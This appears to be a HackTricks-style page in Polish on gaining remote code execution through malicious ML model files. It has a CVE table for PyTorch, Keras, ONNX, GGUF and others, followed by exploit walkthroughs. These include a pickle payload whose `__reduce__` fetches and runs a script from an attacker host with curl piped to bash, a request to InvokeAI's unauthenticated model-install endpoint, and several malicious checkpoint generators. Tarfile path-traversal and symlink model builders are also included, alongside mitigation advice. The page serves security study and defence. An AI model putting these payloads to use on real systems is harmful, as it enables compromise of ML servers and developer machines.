# Modele RCE

{{#include ../banners/hacktricks-training.md}}

## Ładowanie modeli prowadzące do RCE

Uczenie maszynowe jest zazwyczaj udostępniane w różnych formatach, takich jak ONNX, TensorFlow, PyTorch itp. Modele te mogą być ładowane na maszyny deweloperów lub systemy produkcyjne w celu ich użycia. Zazwyczaj modele nie powinny zawierać złośliwego kodu, jednak zdarzają się przypadki, gdzie model może zostać użyty do wykonania dowolnego kodu na systemie jako zamierzona funkcja lub z powodu podatności w bibliotece ładującej modele.

W chwili pisania poniżej znajdują się przykłady tego typu podatności:

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Złośliwy pickle w model checkpoint prowadzi do wykonania kodu (omijając zabezpieczenie `weights_only`)                                    | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + złośliwe pobranie modelu powoduje wykonanie kodu; Java deserialization RCE w management API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | Nieufny checkpoint wywołuje pickle reducer podczas `load_model_trainer_states_from_checkpoint` → wykonanie kodu w workerze ML             | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Ładowanie modelu z YAML używa `yaml.unsafe_load` (wykonanie kodu) <br> Ładowanie modelu z warstwą **Lambda** uruchamia dowolny kod Python  | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Spreparowany plik `.tflite` wywołuje overflow integerowy → korupcja sterty (potencjalne RCE)                                             | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Ładowanie modelu przez `joblib.load` wykonuje pickle z ładunkiem atakującego poprzez `__reduce__`                                       | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | Domyślnie `numpy.load` pozwala na pickled object arrays – złośliwe `.npy/.npz` uruchamia wykonanie kodu                                 | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | Zewnętrzna ścieżka external-weights w modelu ONNX może uciec poza katalog (odczyt dowolnych plików) <br> Złośliwy tar modelu ONNX może nadpisać dowolne pliki (prowadząc do RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Model z custom operatorem wymaga załadowania natywnego kodu atakującego; złożone grafy modelu mogą nadużyć logikę, by wykonać niezamierzone obliczenia | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Użycie model-load API z włączonym `--model-control` pozwala na względną traversję ścieżek do zapisu plików (np. nadpisanie `.bashrc` dla RCE) | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Uszkodzony plik modelu GGUF powoduje przepełnienia bufora na stercie w parserze, umożliwiając wykonanie dowolnego kodu na systemie ofiary | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Złośliwy HDF5 (`.h5`) model z kodem w warstwie Lambda nadal wykonuje się przy ładowaniu (Keras safe_mode nie obejmuje starego formatu – „downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Wiele narzędzi ML (np. formaty oparte na pickle, Python `pickle.load`) wykona dowolny kod osadzony w plikach modelu, o ile nie zostaną zastosowane zabezpieczenia | |

Co więcej, istnieją niektóre modele oparte na python-pickle, jak te używane przez [PyTorch](https://github.com/pytorch/pytorch/security), które mogą zostać użyte do wykonania dowolnego kodu na systemie, jeśli nie są ładowane z `weights_only=True`. Zatem każdy model oparty na pickle może być szczególnie podatny na tego typu ataki, nawet jeśli nie został wymieniony w powyższej tabeli.

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` to popularny open-source web interface dla Stable-Diffusion. Wersje **5.3.1 – 5.4.2** udostępniają endpoint REST `/api/v2/models/install`, który pozwala użytkownikom pobierać i ładować modele z dowolnych URLi.

Wewnątrz endpointu ostatecznie wywoływana jest:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Gdy dostarczony plik jest **PyTorch checkpoint (`*.ckpt`)**, `torch.load` wykonuje **pickle deserialization**. Ponieważ zawartość pochodzi bezpośrednio z URL kontrolowanego przez użytkownika, atakujący może osadzić złośliwy obiekt z niestandardową metodą `__reduce__` wewnątrz checkpointu; metoda jest wykonywana **during deserialization**, co prowadzi do **remote code execution (RCE)** na serwerze InvokeAI.

Ta podatność otrzymała oznaczenie **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Exploitation walk-through

1. Utwórz złośliwy checkpoint:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Umieść `payload.ckpt` na serwerze HTTP, którym zarządzasz (np. `http://ATTACKER/payload.ckpt`).
3. Wywołaj podatny endpoint (uwierzytelnianie nie jest wymagane):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Gdy InvokeAI pobiera plik, wywołuje `torch.load()` → gadget `os.system` zostaje uruchomiony i atakujący uzyskuje wykonanie kodu w kontekście procesu InvokeAI.

Gotowy exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` automatyzuje cały proces.

#### Warunki

•  InvokeAI 5.3.1-5.4.2 (scan flag default **false**)  
•  `/api/v2/models/install` osiągalny przez atakującego  
•  Proces ma uprawnienia do wykonywania shell commands

#### Środki zaradcze

* Zaktualizuj do **InvokeAI ≥ 5.4.3** – łatka ustawia `scan=True` domyślnie i wykonuje skanowanie w poszukiwaniu malware przed deserializacją.  
* Podczas programowego ładowania checkpoints użyj `torch.load(file, weights_only=True)` lub nowego [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helpera.  
* Wymuszaj allow-lists / signatures dla źródeł modeli i uruchamiaj usługę z zasadą najmniejszych uprawnień.

> ⚠️ Pamiętaj, że **każdy** format oparty na Python pickle (w tym wiele plików `.pt`, `.pkl`, `.ckpt`, `.pth`) jest z natury niebezpieczny przy deserializacji z niezweryfikowanych źródeł.

---

Przykład doraźnego zabezpieczenia, jeśli musisz utrzymać starsze wersje InvokeAI działające za reverse proxy:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE przez niebezpieczne `torch.load` (CVE-2025-23298)

Transformers4Rec firmy NVIDIA (część Merlin) udostępnił niebezpieczny loader checkpointów, który bezpośrednio wywoływał `torch.load()` na ścieżkach podanych przez użytkownika. Ponieważ `torch.load` opiera się na Python `pickle`, checkpoint kontrolowany przez atakującego może wykonać dowolny kod poprzez reducer podczas deserializacji.

Ścieżka podatna (przed poprawką): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Dlaczego to prowadzi do RCE: W Pythonowym pickle obiekt może zdefiniować reducer (`__reduce__`/`__setstate__`), który zwraca callable i argumenty. Callable jest wykonywany podczas unpicklingu. Jeśli taki obiekt znajduje się w checkpointcie, uruchamia się on zanim jakiekolwiek wagi zostaną użyte.

Minimalny przykład złośliwego checkpointu:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Wektory dostarczenia i zasięg oddziaływania:
- Trojanized checkpoints/models shared via repos, buckets, or artifact registries
- Automated resume/deploy pipelines that auto-load checkpoints
- Execution happens inside training/inference workers, often with elevated privileges (e.g., root in containers)

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) replaced the direct `torch.load()` with a restricted, allow-listed deserializer implemented in `transformers4rec/utils/serialization.py`. The new loader validates types/fields and prevents arbitrary callables from being invoked during load.

Zalecenia obronne specyficzne dla PyTorch checkpoints:
- Do not unpickle untrusted data. Prefer non-executable formats like [Safetensors](https://huggingface.co/docs/safetensors/index) or ONNX when possible.
- If you must use PyTorch serialization, ensure `weights_only=True` (supported in newer PyTorch) or use a custom allow-listed unpickler similar to the Transformers4Rec patch.
- Enforce model provenance/signatures and sandbox deserialization (seccomp/AppArmor; non-root user; restricted FS and no network egress).
- Monitor for unexpected child processes from ML services at checkpoint load time; trace `torch.load()`/`pickle` usage.

POC and vulnerable/patch references:
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Przykład – tworzenie złośliwego modelu PyTorch

- Create the model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Załaduj model:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
## Modele do Path Traversal

Jak wspomniano w [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), większość formatów modeli używanych przez różne frameworki AI opiera się na archiwach, zazwyczaj `.zip`. Z tego powodu możliwe jest nadużycie tych formatów do przeprowadzenia ataków Path Traversal, umożliwiających odczyt dowolnych plików z systemu, w którym model jest załadowany.

Na przykład, używając poniższego kodu możesz stworzyć model, który utworzy plik w katalogu `/tmp` podczas ładowania:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Albo, za pomocą poniższego kodu możesz stworzyć model, który po załadowaniu utworzy symlink do katalogu `/tmp`:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Dogłębna analiza: Keras .keras deserialization and gadget hunting

Aby uzyskać skoncentrowany przewodnik na temat .keras internals, Lambda-layer RCE, the arbitrary import issue in ≤ 3.8 oraz post-fix gadget discovery inside the allowlist, zobacz:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Źródła

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)

{{#include ../banners/hacktricks-training.md}}
